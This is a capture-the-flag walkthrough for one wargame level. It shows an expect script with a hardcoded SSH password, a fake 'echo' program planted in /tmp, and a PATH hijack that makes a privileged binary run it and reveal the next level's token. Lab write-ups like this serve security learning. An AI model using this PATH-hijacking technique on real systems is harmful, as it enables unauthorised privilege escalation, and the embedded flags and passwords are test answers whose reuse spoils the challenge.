# Level 03
- In the shell of your choice run the script attached or follow the steps bellow using your VM IP address to get the flag, also root privileges and some dependencies may be needed to install before
	```sh
	$ chmod u+x script.sh
	$ ./script.sh
	$ cat script.sh
	#!/usr/bin/expect -f
	set ip 192.168.1.103
	spawn ssh -o "StrictHostKeyChecking no" level03@$ip -p 4242 "mkdir -p /tmp/level03 ; cd /tmp/level03 ; chmod 777 . ; echo 'void main(void) \{ system\(\"getflag\"\)\; \}' > echo.c ; gcc echo.c -o echo ; PATH=/tmp/level03:\$PATH ; ~/level03"
	expect "sword:"
	send "kooda2puivaav1idi4f57q8iq\r"
	interact
	```
- List content of the home directory
	```sh
	$ ls -l
	```
- Run its only executable file `./level03` to see a challenge
- Use `ltrace` utility to trace the libraries calls
	```sh
	$ ltrace ./level03
	```
- Make a directory with a program in `/tmp` location to imitate the `echo` system call
	```sh
	$ mkdir -p /tmp/level03
	$ cd /tmp/level03
	$ chmod 777 .
	$ vim /tmp/echo.c
	void main(void) {
		system("getflag");
	}
	$ gcc echo.c -o echo
	```
- Add its location to the begin of `PATH` environment variable
	```sh
	$ PATH=/tmp/level03:$PATH
	```
- Run the executable file again to exploit the system call of `echo` utility and to get the flag
	```sh
	$ ~/level03
	```
- With the token provided `qi0maab88jeaj46qoumi7maus` switch to the next user level
	```sh
	$ su level04
	Password: qi0maab88jeaj46qoumi7maus
	```
